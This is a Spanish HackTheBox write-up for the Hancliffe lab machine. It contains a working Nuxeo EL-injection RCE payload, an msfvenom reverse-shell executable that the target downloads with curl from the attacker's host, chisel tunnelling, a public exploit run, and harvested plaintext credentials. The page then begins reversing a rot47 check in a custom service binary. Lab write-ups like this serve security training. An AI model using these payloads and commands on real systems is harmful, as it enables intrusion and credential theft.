<!DOCTYPE html>
<html>
  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="robots" content="noindex">

  <title>Writeup HackTheBox Hancliffe</title>

  <meta name="description" content="Resolución de la máquina Hancliffe de la plataforma de HackTheBox">
  <meta name="author" content="xchg2pwn">
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Writeup HackTheBox Hancliffe">
  <meta name="twitter:description" content="Resolución de la máquina Hancliffe de la plataforma de HackTheBox">
  <meta name="twitter:creator" content="xchg2pwn">  
  <meta name="twitter:image" content="/images/hackthebox/hancliffe.png" />

  <meta property="og:site_name" content="xchg2pwn" />
  <meta property="og:type" content="article">
  <meta property="og:title" content="Writeup HackTheBox Hancliffe">
  <meta property="og:description" content="Resolución de la máquina Hancliffe de la plataforma de HackTheBox">
  <meta property="og:image" content="/images/hackthebox/hancliffe.png" />

  <link rel="manifest" href="/images/favicons/manifest.json">
  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/hackthebox/hancliffe.png">

  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">
  
  <meta name="msapplication-TileColor" content="#ffc40d">
  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
  <meta name="theme-color" content="#ffffff">

  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Hancliffe" href="/feed.xml">
</head>

  <body style="background-color: #282828;">
  
    <span class="mobile btn-mobile-menu">
      <i class="icon icon-list btn-mobile-menu__icon"></i>
      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

<header class="panel-cover" style="background-image: url(/images/cover.jpg)">

  <div class="panel-main">
    <div class="panel-main__inner panel-inverted">
      <div class="panel-main__content">

          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>

        <hr class="panel-cover__divider">
        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary">

        <div class="navigation-wrapper">
         <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">
              <li class="navigation__item grow"><a href="/hackthebox" title="xchg2pwn" class="blog-button">HackTheBox</a></li>
            </ul>
          </nav>

          <nav class="cover-navigation navigation--social">
            <ul class="navigation">
              
              <li class="navigation__item grow">
                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
                  <i class="icon icon-social-github"></i>
                  <span class="label">GitHub</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://linkedin.com/in/xchg2pwn" title="Linkedin" target="_blank">
                  <i class="icon icon-social-linkedin"></i>
                  <span class="label">Linkedin</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
                  <i class="icon icon-social-instagram"></i>
                  <span class="label">Instagram</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
                  <i class="icon icon-social-twitter"></i>
                  <span class="label">Twitter</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
                  <i class="icon icon-social-youtube"></i>
                  <span class="label">Youtube</span>
                </a>
              </li>

              <li class="navigation__item grow">
                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
                  <i class="icon icon-mail"></i>
                  <span class="label">Email</span>
                </a>
              </li>

            </ul>
          </nav>
        </div>
      </div>
    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>
    <br>
    <div class="content-wrapper">
      <div class="content-wrapper__inner">
        <article class="post-container post-container--single">
    <div class="izquierda">
      <h3 class="post-title">Contenido</h3><br>
      <ul>
        <li><a href="#enumeration">Enumeración</a></li>
        <li><a href="#shell-svc_account">Shell - svc_account</a></li>
        <li><a href="#shell-clara">Shell - clara</a></li>
        <li><a href="#shell-development">Shell - development</a></li>
        <li><a href="#shell-administrator">Shell - Administrator</a></li>
        <li><a href="#bof-socketreuse">BOF - socket reuse</a></li>
        <li><a href="#bof-egghunter">BOF - egghunter</a></li>
        <li><a href="#bof-loadlibrary">BOF - loadlibrary</a></li>
        <li><a href="#extra-administrator">Extra - Administrator</a></li>
      </ul>
  </div>

  <header class="post-header slide-top">
    <h4 class="post-title">HackTheBox</h4>
    <picture><img src="/images/hackthebox/hancliffe.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
    <h2 class="post-title">Hancliffe</h2><br>
  </header>
  
<section class="post" id="enumeration">
<br><h3 class="post-title">Enumeración</h3><br>

<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos entre ellos el <code class="language-plaintext highlighter-rouge">80</code> que corre un servicio <code class="language-plaintext highlighter-rouge">http</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nmap </span><span class="p">10.10.11.115
Nmap scan report for 10.10.11.115  
PORT     STATE SERVICE
80/tcp   open  http
8000/tcp open  http-alt
9999/tcp open  abyss</span>
</code></pre></div></div><br>

<p class="plain-text">En el puerto <code class="language-plaintext highlighter-rouge">9999</code> que esta abierto parece que esta corriendo algun servicio personalizado sin embargo para acceder a el necesitamos <code class="language-plaintext highlighter-rouge">credenciales</code> validas</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ netcat </span><span class="p">10.10.11.115 9999
Welcome Brankas Application.
Username: username
Password: password
Username or Password incorrect  </span>
</code></pre></div></div><br>

<p class="plain-text">En el puerto <code class="language-plaintext highlighter-rouge">8000</code> podemos encontrar un <code class="language-plaintext highlighter-rouge">Password Manager</code> que por ahora no nos sirve de nada y en el <code class="language-plaintext highlighter-rouge">80</code> una pagina por defecto de <code class="language-plaintext highlighter-rouge">nginx</code> sin nada interesante</p>
<a href="/hackthebox/hancliffe/1.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/1.png"></p></div></a>
<a href="/hackthebox/hancliffe/2.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/2.png"></p></div></a>

<p class="plain-text">Ya que no hay nada interesante podriamos usar <code class="language-plaintext highlighter-rouge">wfuzz</code> para intentar descubrir directorios bajo el puerto 80, la ruta <code class="language-plaintext highlighter-rouge">/maintenance</code> nos devuelve un <code class="language-plaintext highlighter-rouge">302</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ wfuzz </span><span class="p">-c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.11.115/FUZZ -t 100 --hc 404  
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.115/FUZZ
Total requests: 30000

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000618:   </span><span class="az">302</span><span class="p">        0 L      0 W        0 Ch        "maintenance"</span>
</code></pre></div></div><br>

<p class="plain-text">Si miramos a donde nos redirige nos lleva a <code class="language-plaintext highlighter-rouge">/nuxeo/Maintenance/</code>, si intentamos acceder desde al navegador nos devolvera <code class="language-plaintext highlighter-rouge">404</code> ya que /nuxeo no existe</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl</span><span class="p"> -s 10.10.11.115/maintenance -I | </span><span class="ve">grep </span><span class="p">Location  
</span><span class="ro">Location</span><span class="p">: /nuxeo/Maintenance/</span>
</code></pre></div></div><br>
<a href="/hackthebox/hancliffe/3.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/3.png"></p></div></a>

<p class="plain-text">Al agregar una / al final devuelve un <code class="language-plaintext highlighter-rouge">200</code> ademas nos setea una cookie para /nuxeo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl </span><span class="p">http://10.10.11.115/maintenance/ -I
HTTP/1.1 200 
Server: nginx/1.21.0
Date: Sun, 22 Oct 2023 13:43:58 GMT
Content-Type: text/html;charset=ISO-8859-1
Connection: keep-alive
Vary: Accept-Encoding
X-Frame-Options: SAMEORIGIN
X-UA-Compatible: IE=10; IE=11
Cache-Control: no-cache, no-store, must-revalidate
X-Content-Type-Options: nosniff
Content-Security-Policy: img-src data: blob: *; default-src blob: *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: *  
X-XSS-Protection: 1; mode=block
Set-Cookie: JSESSIONID=466264FD2C98FE4830D890FC850FED8E.nuxeo; Path=/nuxeo; HttpOnly
Vary: Accept-Encoding</span>
</code></pre></div></div><br>

<p class="plain-text">Buscando posibles vulnerabilidades llegamos a un <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf">pdf</a> con diferentes payloads para romper la logica parser de diferentes lenguajes, podriamos probar <code class="language-plaintext highlighter-rouge">..;</code> ya que esta montado en java y al enviarlo nos redirige a <code class="language-plaintext highlighter-rouge">/nuxeo/nxstartup.faces</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl </span><span class="am">'http://10.10.11.115/maintenance/..;/' </span><span class="p">-b JSESSIONID=466264FD2C98FE4830D890FC850FED8E.nuxeo -I
HTTP/1.1 302 
Server: nginx/1.21.0
Date: Sun, 22 Oct 2023 13:45:06 GMT
Content-Type: text/html;charset=ISO-8859-1
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-UA-Compatible: IE=10; IE=11
Cache-Control: no-cache, no-store, must-revalidate
X-Content-Type-Options: nosniff
Content-Security-Policy: img-src data: blob: *; default-src blob: *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: *  
X-XSS-Protection: 1; mode=block
Location: http://10.10.11.115/nuxeo/nxstartup.faces
Vary: Accept-Encoding</span>
</code></pre></div></div><br>

<p class="plain-text">Al acceder al <code class="language-plaintext highlighter-rouge">.faces</code> carga un javascript que nuevamente nos redirige a un <code class="language-plaintext highlighter-rouge">.jsp</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ curl </span><span class="am">'http://10.10.11.115/maintenance/..;/nuxeo/nxstartup.faces'</span><span class="p"> -b JSESSIONID=466264FD2C98FE4830D890FC850FED8E.nuxeo -i
HTTP/1.1 401 
Server: nginx/1.21.0
Date: Sun, 22 Oct 2023 13:45:42 GMT
Content-Type: text/html;charset=UTF-8
Content-Length: 221
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-UA-Compatible: IE=10; IE=11
Cache-Control: no-cache, no-store, must-revalidate
X-Content-Type-Options: nosniff
Content-Security-Policy: img-src data: blob: *; default-src blob: *; script-src 'unsafe-inline' 'unsafe-eval' data: *; style-src 'unsafe-inline' *; font-src data: *  
X-XSS-Protection: 1; mode=block

&ltscript type="text/javascript">
document.cookie = 'nuxeo.start.url.fragment=' + encodeURIComponent(window.location.hash.substring(1) || '') + '; path=/';
window.location = 'http://10.10.11.115/nuxeo/login.jsp';
&lt/script></span>
</code></pre></div></div><br>

<p class="plain-text">Podemos acceder al <code class="language-plaintext highlighter-rouge">login.jsp</code> desde el navegador aprovechandonos del <code class="language-plaintext highlighter-rouge">..;</code> al acceder, abajo del todo podemos ver que esta corriendo <code class="language-plaintext highlighter-rouge">Nuxeo</code> en la verión <code class="language-plaintext highlighter-rouge">FT 10.2</code></p>
<a href="/hackthebox/hancliffe/4.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/4.png"></p></div></a>

</section>

<section class="post" id="shell-svc_account">
<br><h3 class="post-title">Shell - svc_account</h3><br>

<p class="plain-text">Al buscar vulnerabilidades de este servicio nos lleva al <a href="https://github.com/mpgn/CVE-2018-16341">CVE-2018-16341</a> que para saber si es vulnerable nos muestra un poc, enviamos <code class="language-plaintext highlighter-rouge">/pwn${-7+7}.xhtml</code> y lo interpreta</p>
<a href="/hackthebox/hancliffe/5.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/5.png"></p></div></a>

<p class="plain-text">Podemos enviar ahora el <code class="language-plaintext highlighter-rouge">payload</code> que nos permite ejecutar comandos para comprobar y si nos enviamos un <code class="language-plaintext highlighter-rouge">curl</code> recibimos la petición, tenemos RCE</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">http://10.10.11.115/maintenance/..;/login.jsp/pwn${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl 10.10.14.10",null).waitFor()}.xhtml  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo python3 </span><span class="p">-m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
10.10.11.115 - - "GET / HTTP/1.1" 200 -</span>
</code></pre></div></div><br>

<p class="plain-text">Para ganar acceso podemos crear un <code class="language-plaintext highlighter-rouge">exe</code> malicioso con msfvenom que nos envie una shell, despues ejecutamos un comando que lo descargue y otro que lo <code class="language-plaintext highlighter-rouge">ejecute</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/x64/powershell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o shell.exe  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1885 bytes
Final size of exe file: 8192 bytes
Saved as: shell.exe</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">curl 10.10.14.10/shell.exe -o C:\ProgramData\shell.exe  
cmd /c C:/ProgramData/shell.exe  </span>
</code></pre></div></div><br>

<p class="plain-text">Al descargar el exe y ejecutarlo en la maquina victima nos envia una <code class="language-plaintext highlighter-rouge">shell</code> y solo con esto ya ganamos acceso como el usuario <code class="language-plaintext highlighter-rouge">svc_account</code> en la maquina victima</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.115 
Windows PowerShell running as user svc_account on HANCLIFFE  
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Nuxeo> </span><span class="am">whoami</span><span class="p">
hancliffe\svc_account
PS C:\Nuxeo></span>
</code></pre></div></div><br>

</section>

<section class="post" id="shell-clara">
<br><h3 class="post-title">Shell - clara</h3><br>

<p class="plain-text">Enumerando el equipo podemos ver que esta instalado <code class="language-plaintext highlighter-rouge">Unified Remote 3</code> que tiene un <a href="https://www.exploit-db.com/exploits/49587">exploit</a> publico, sabemos que este servicio esta corriendo por puerto local <code class="language-plaintext highlighter-rouge">9512</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Program Files (x86)\Unified Remote 3> </span><span class="am">dir</span><span class="p">

    Directory: C:\Program Files (x86)\Unified Remote 3

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         6/12/2021  12:21 AM                Manager
d-----         6/12/2021  12:21 AM                uvhid
-a----         5/29/2017   4:55 AM        1846272 libcryptoMD.dll
-a----         5/29/2017   4:55 AM         382976 libsslMD.dll
-a----         11/3/2020   4:50 PM        3243784 RemoteServerWin.exe  
-a----         6/12/2021  12:21 AM         183608 unins000.dat
-a----         6/12/2021  12:19 AM        2580744 unins000.exe
-a----         6/12/2021  12:21 AM          23277 unins000.msg
-a----        10/10/2016   6:27 AM         556544 wcl.dll
-a----        10/10/2016   5:34 AM         188416 wcl2wbt.dll

PS C:\Program Files (x86)\Unified Remote 3> </span><span class="am">netstat </span><span class="c1">-nat</span><span class="p"> | </span><span class="am">Select-String </span><span class="p">9512

  TCP    0.0.0.0:9512           0.0.0.0:0              LISTENING       InHost  
  UDP    0.0.0.0:9512           *:*                                                

PS C:\Program Files (x86)\Unified Remote 3></span>
</code></pre></div></div><br>

<p class="plain-text">Como desde fuera no tenemos acceso a ese puerto creamos un tunel con <code class="language-plaintext highlighter-rouge">chisel</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\ProgramData> </span><span class="am">curl </span><span class="p">10.10.14.10/chisel.exe -o chisel.exe  
PS C:\ProgramData> </span><span class="am">.\chisel.exe </span><span class="p">client 10.10.14.10:9999 R:socks  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ chisel </span><span class="p">server --reverse --port 9999
server: Reverse tunnelling enabled
server: Listening on http://0.0.0.0:9999
server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening  </span>
</code></pre></div></div><br>

<p class="plain-text">Ahora pasando por el proxy con <code class="language-plaintext highlighter-rouge">proxychains</code> podemos ejecutar el <a href="https://www.exploit-db.com/exploits/49587">exploit</a> que requiere 3 argumentos, la ip victima, nuestra ip y el nombre del <code class="language-plaintext highlighter-rouge">exe</code> a ejecutar</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ proxychains </span><span class="p">-q python2 49587.py 10.10.11.115 10.10.14.10 shell.exe  
[+] Connecting to target...
[+] Popping Start Menu
[+] Opening CMD
[+] *Super Fast Hacker Typing*
[+] Downloading Payload
[+] Done! Check listener?</span>
</code></pre></div></div><br>

<p class="plain-text">Despues de ejecutar el exploit este descarga nuestro <code class="language-plaintext highlighter-rouge">exe</code> malicioso y al ejecutarlo nos envia una <code class="language-plaintext highlighter-rouge">shell</code> como el usuario que corre el servicio que es <code class="language-plaintext highlighter-rouge">clara</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.115
Windows PowerShell running as user clara on HANCLIFFE
Copyright (C) Microsoft Corporation. All rights reserved.  

PS C:\Users\clara> </span><span class="am">whoami</span><span class="p">
hancliffe\clara
PS C:\Users\clara> </span><span class="am">type </span><span class="p">Desktop\user.txt
cce**************************bb8
PS C:\Users\clara></span>
</code></pre></div></div><br>

</section>

<section class="post" id="shell-development">
<br><h3 class="post-title">Shell - development</h3><br>

<p class="plain-text">Para enumerar el equipo podemos ejecutar <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">winpeas</a> que entre mucha informacion nos muestra unas <code class="language-plaintext highlighter-rouge">credenciales</code> en texto plano que fueron guardadas en firefox</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="az">╔══════════╣ </span><span class="ve">Showing saved credentials for Firefox</span><span class="ro">
     Url:           http://localhost:8000
     Username:      hancliffe.htb
     Password:      #@H@ncLiff3D3velopm3ntM@st3rK3y*!  </span>
</code></pre></div></div><br>

<p class="plain-text">Aunque en la credencial no se especifica un usuario por descarte podemos deducir que es de <code class="language-plaintext highlighter-rouge">development</code> sin embargo la contrasña no es valida en el sistema</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\clara> </span><span class="am">net </span><span class="p">user

User accounts for \\HANCLIFFE

--------------------------------------------------------------------------  
Administrator            clara                    DefaultAccount           
development              Guest                    svc_account              
WDAGUtilityAccount       

The command completed successfully.

PS C:\Users\clara></span>
</code></pre></div></div><br>

<p class="plain-text">Al inicio habiamos visto un <code class="language-plaintext highlighter-rouge">Password Manager</code> asi que como el usuario <code class="language-plaintext highlighter-rouge">development</code> y la contraseña encontrada podemos intentar generar la <code class="language-plaintext highlighter-rouge">contraseña</code> del usuario</p>
<a href="/hackthebox/hancliffe/6.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/6.png"></p></div></a>

<p class="plain-text">La nueva contraseña generada es valida en el sistema para el usuaro <code class="language-plaintext highlighter-rouge">development</code>, este usuario puede conectarse a <code class="language-plaintext highlighter-rouge">winrm</code> por lo que podemos ganar una shell</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ proxychains </span><span class="p">-q evil-winrm -i 10.10.11.115 -u development -p </span><span class="am">'AMl.q2DHp?2.C/V0kNFU'  </span><span class="p">
PS C:\Users\development\Documents> </span><span class="am">whoami</span><span class="p">
hancliffe\development
PS C:\Users\development\Documents></span>
</code></pre></div></div><br>

</section>

<section class="post" id="shell-administrator">
<br><h3 class="post-title">Shell - Administrator</h3><br>

<p class="plain-text">Mirando las rutas excluidas para <code class="language-plaintext highlighter-rouge">Windows Defender</code> a traves de registros podemos encontrar un binario <code class="language-plaintext highlighter-rouge">MyFirstApp.exe</code> que se encuentra en la ruta <code class="language-plaintext highlighter-rouge">C:\DevApp</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\Users\development\Documents> </span><span class="am">reg </span><span class="p">query </span><span class="az">'HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths'</span><span class="p">  

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
    C:\DevApp\MyFirstApp.exe    REG_DWORD    0x0

PS C:\Users\development\Documents></span>
</code></pre></div></div><br>

<p class="plain-text">En esa ruta se encuentra el <code class="language-plaintext highlighter-rouge">exe</code> ademas de un script en powershell que simplemente se encarga de reiniciar el proceso cada 3 minutos y exponerlo en el puerto <code class="language-plaintext highlighter-rouge">9999</code>, ya que es el servicio que corre en ese puerto lo descargaremos para analizarlo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">PS C:\DevApp> </span><span class="am">dir</span><span class="p">

    Directory: C:\DevApp

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/14/2021   5:02 AM          60026 MyFirstApp.exe  
-a----         9/14/2021  10:57 AM            636 restart.ps1

PS C:\DevApp> </span><span class="am">download </span><span class="p">MyFirstApp.exe MyFirstApp.exe

</span><span class="az">Info: Downloading C:\DevApp\MyFirstApp.exe to MyFirstApp.exe

Info: Download successful!
</span><span class="p">
PS C:\DevApp></span>
</code></pre></div></div><br>

<p class="plain-text">Iniciemos analizando el binario, para ello podemos usar un desensamblador como <code class="language-plaintext highlighter-rouge">ida</code>, la función <code class="language-plaintext highlighter-rouge">main</code> inicia llamando a <code class="language-plaintext highlighter-rouge">WSAStartup</code> que inicia el uso del archivo dll de <code class="language-plaintext highlighter-rouge">Winsock</code>, luego llama a <code class="language-plaintext highlighter-rouge">getaddrinfo</code> estableciendo los datos de esta estructura</p>
<a href="/hackthebox/hancliffe/7.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/7.png"></p></div></a>

<p class="plain-text">Luego llama a <code class="language-plaintext highlighter-rouge">socket</code> que crea un nuevo socket y guarda el descriptor en una variable <code class="language-plaintext highlighter-rouge">s</code>, si esta es igual a <code class="language-plaintext highlighter-rouge">-1</code> lanza un error de lo contrario sigue la flecha verde</p>
<a href="/hackthebox/hancliffe/8.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/8.png"></p></div></a>

<p class="plain-text">Ahora usando <code class="language-plaintext highlighter-rouge">srand</code> y <code class="language-plaintext highlighter-rouge">rand</code> basandose en el tiempo usando la función <code class="language-plaintext highlighter-rouge">time</code> crea un numero de puerto aleatorio entre <code class="language-plaintext highlighter-rouge">9000</code> y <code class="language-plaintext highlighter-rouge">9999</code>, luego utiliza <code class="language-plaintext highlighter-rouge">htons</code> para darle el formato de puerto, lo asigna a la estructura y muestra este puerto con <code class="language-plaintext highlighter-rouge">printf</code></p>
<a href="/hackthebox/hancliffe/9.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/9.png"></p></div></a>

<p class="plain-text">Luego llama a <code class="language-plaintext highlighter-rouge">bind</code> para vincular el socket a la dirección obtenida y a <code class="language-plaintext highlighter-rouge">listen</code> para ponerse en escucha de nuevas conexiones utilizando ese puerto aleatorio</p>
<a href="/hackthebox/hancliffe/10.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/10.png"></p></div></a>

<p class="plain-text">Si se recibe una conexión la acepta utilizando <code class="language-plaintext highlighter-rouge">accept</code> que devuelve un nuevo descriptor, muestra un mensaje que recibió una conexión y crea un nuevo hilo llamando a la función <code class="language-plaintext highlighter-rouge">cHandler</code> que se encarga de controlar las conexiones</p>
<a href="/hackthebox/hancliffe/11.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/11.png"></p></div></a>

<p class="plain-text">La función cHandler inicia reservando espacios de memoria de <code class="language-plaintext highlighter-rouge">0x400</code> o <code class="language-plaintext highlighter-rouge">1024</code> bytes, luego con <code class="language-plaintext highlighter-rouge">send</code> envia un mesnaje de bienvenida, siguiendo la linea verde compara el nuevo descriptor con <code class="language-plaintext highlighter-rouge">0</code>, esto con el fin de comprobar que tenga asignado un valor</p>
<a href="/hackthebox/hancliffe/12.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/12.png"></p></div></a>

<p class="plain-text">Luego mueve a <code class="language-plaintext highlighter-rouge">auth</code> el valor <code class="language-plaintext highlighter-rouge">0</code>, luego con <code class="language-plaintext highlighter-rouge">send</code> muestra un mensaje que pide un usuario para luego recibir un buffer que copia a la variable <code class="language-plaintext highlighter-rouge">username</code> con <code class="language-plaintext highlighter-rouge">strncpy</code></p>
<a href="/hackthebox/hancliffe/13.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/13.png"></p></div></a>

<p class="plain-text">Repite este mismo proceso pero para la variable <code class="language-plaintext highlighter-rouge">password</code>, en resumen recibe un usuario y una contraseña, una vez recibió ambos llama a la función <code class="language-plaintext highlighter-rouge">login</code> pasandoselos como argumentos y hace un salto condicional con el resultado</p>
<a href="/hackthebox/hancliffe/14.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/14.png"></p></div></a>

<p class="plain-text">Inicia definiendo como usuario la string <code class="language-plaintext highlighter-rouge">alfiansyah</code>, y como contraseña una cadena que parece ser <code class="language-plaintext highlighter-rouge">base64</code>, luego le pasa el segundo parametro como argumento a <code class="language-plaintext highlighter-rouge">encrypt1</code> y el valor que esta función devuelve lo pasa a <code class="language-plaintext highlighter-rouge">encrypt2</code>, mide la longitud, cifra la cadena en <code class="language-plaintext highlighter-rouge">base64</code> y lo compara con la cadena en <code class="language-plaintext highlighter-rouge">base64</code> que define al inicio</p>
<a href="/hackthebox/hancliffe/15.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/15.png"></p></div></a>

<p class="plain-text">Si la contraseña que recibe como argumento al cifrarse es igual a la cadena en <code class="language-plaintext highlighter-rouge">base64</code> definida al inicio devuelve <code class="language-plaintext highlighter-rouge">true</code>, de lo contrario simplemente un <code class="language-plaintext highlighter-rouge">false</code></p>
<a href="/hackthebox/hancliffe/16.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/16.png"></p></div></a>

<p class="plain-text">Analicemos <code class="language-plaintext highlighter-rouge">encrypt1</code>, inicia llamando a <code class="language-plaintext highlighter-rouge">strdup</code> con el argumento para duplicarlo en <code class="language-plaintext highlighter-rouge">password</code>, luego se inicia una variable <code class="language-plaintext highlighter-rouge">c</code> a <code class="language-plaintext highlighter-rouge">0</code> que servira como contador, compara que no sea mayor que la longitud de la cadena y si no es asi compara el byte actual sea mayor que <code class="language-plaintext highlighter-rouge">0x20</code> asegurandose que sea un caracter <code class="language-plaintext highlighter-rouge">ascii</code> y no menor</p>
<a href="/hackthebox/hancliffe/17.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/17.png"></p></div></a>

<p class="plain-text">Luego compara el que el byte sea menor que <code class="language-plaintext highlighter-rouge">0x7f</code> ya que es el valor máximo de caractéres <code class="language-plaintext highlighter-rouge">ascii</code>, si es un caracter válido mueve su valor a <code class="language-plaintext highlighter-rouge">eax</code> y le suma <code class="language-plaintext highlighter-rouge">47</code> con <code class="language-plaintext highlighter-rouge">add</code>, si el resultado de esta operación es menor que <code class="language-plaintext highlighter-rouge">0x7f</code> mueve el caracter sin cambios pero si es mayor que <code class="language-plaintext highlighter-rouge">0x7e</code> resta <code class="language-plaintext highlighter-rouge">0x5e</code>, esto es un cifrado muy conocido llamado <a href="https://es.wikipedia.org/wiki/ROT13#Implementaci%C3%B3n_en_VB_de_ROT47">rot47</a>, ahora que sabemos la operación podemos realizarla a la inversa</p>

<a href="/hackthebox/hancliffe/18.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/18.png"></p></div></a>

